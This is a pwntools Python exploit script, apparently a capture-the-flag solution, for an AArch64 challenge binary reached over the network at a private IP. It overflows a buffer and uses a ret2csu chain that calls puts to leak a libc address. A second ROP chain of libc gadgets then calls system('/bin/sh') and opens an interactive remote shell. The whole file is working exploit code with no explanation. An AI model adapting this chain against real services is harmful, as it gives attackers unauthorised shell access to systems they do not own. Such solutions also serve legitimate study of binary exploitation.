from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('chall')
libc = ELF('libc.so.6')

#p = process(["qemu-aarch64","-g", "1234", "-L", "/usr/aarch64-linux-gnu/",  elf.path])
p = remote('192.168.18.48',5000)

#script = "b * main+32\n"
#gdb.attach(('localhost', 1234), exe=elf.path, gdbscript=script)

csu_pop = elf.sym.__libc_csu_init+104
csu_mov = elf.sym.__libc_csu_init+72

payload = cyclic(40, n=8)
payload += p64(csu_pop)
payload += p64(0x29)
payload += p64(csu_mov)
payload += p64(0) + p64(1) + p64(elf.got.puts) + p64(elf.got.puts) + p64(0) + p64(0)

payload += p64(0x29)
payload += p64(elf.sym.main)
payload += p64(0x19) + p64(0x20) + p64(0x21) + p64(0x22) + p64(0x23) + p64(0x23) + p64(0x24)

p.sendlineafter(b"> ", payload)

#leak = 0x5500000000 | unpack(p.recvline().strip(),'all')
leak = unpack(p.recvline().strip(),'all')
print(f"{hex(leak) = }")

#libc.address = 0x5500000000 | leak - libc.sym.puts
libc.address = leak - libc.sym.puts
print(f"{hex(libc.address) = }")

payload = cyclic(40, n=8)
payload += p64(next(libc.search(asm('ldp x19, x20, [sp, #0x10]; ldp x29,x30, [sp], #0x20; ret;')))) 
payload += p64(0xdeadbeef)
payload += p64(next(libc.search(asm('mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;'))))
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(0xdeadbeef) * 2
payload += p64(libc.sym.system)

p.sendlineafter(b"> ", payload)

p.interactive()
